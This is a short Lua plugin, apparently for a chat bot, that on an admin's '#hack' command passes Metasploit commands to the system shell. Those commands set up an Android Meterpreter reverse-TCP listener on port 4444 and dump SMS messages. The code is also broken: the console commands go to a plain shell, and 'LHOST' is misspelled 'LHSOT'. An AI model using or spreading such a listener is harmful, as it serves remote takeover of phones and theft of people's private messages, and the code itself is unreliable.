function run(msg, matches)
if is_admin(msg) then
text = io.popen("use exploit/multi/handler && set PAYLOAD android/meterpreter/reverse_tcp && set LHSOT 0.0.0.0 && set LPORT 4444 && exploit && dump_sms"):read('*all')
  return text
end
end
return {
patterns = {
  '^[#/!]hack$'
  },
  run = run,
  moderated = true
}
